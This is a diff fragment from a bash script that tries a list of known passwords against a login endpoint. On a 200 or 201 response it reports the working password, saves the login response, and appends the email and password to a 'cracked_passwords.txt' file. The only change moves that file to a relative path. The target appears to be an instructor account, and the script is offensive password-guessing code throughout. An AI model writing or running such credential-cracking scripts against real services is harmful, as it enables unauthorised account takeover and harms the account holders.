@@ -88,7 +88,7 @@ for pwd in "${KNOWN[@]}"; do
     if [ "$code" = "201" ] || [ "$code" = "200" ]; then
         echo "  ✅ [#$COUNT] SUCCESS! Password: '$pwd'"
         echo "$result" | sed '$d' > /tmp/instructor_login_success.json
-        echo "$EMAIL:$pwd" >> /home/ayoub/projects/cyper/cracked_passwords.txt
+        echo "$EMAIL:$pwd" >> ./cracked_passwords.txt
         python3 -c "
 import json
 d = json.load(open('/tmp/instructor_login_success.json'))
